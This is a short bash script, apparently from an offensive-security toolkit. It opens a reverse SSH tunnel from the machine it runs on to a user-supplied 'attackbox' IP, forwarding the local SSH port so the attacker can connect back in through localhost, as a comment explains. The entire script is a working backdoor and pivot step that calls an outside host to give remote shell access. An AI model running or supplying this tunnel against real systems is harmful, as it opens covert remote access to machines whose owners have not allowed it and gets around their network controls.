#!/usr/bin/env bash

set -u

attackbox_port=$1
attackbox_user=$2
attackbox_ip=$3

# attackbox connects: ssh -p [port] [user]@localhost
ssh -N -R $attackbox_port:localhost:22 $attackbox_user@$attackbox_ip
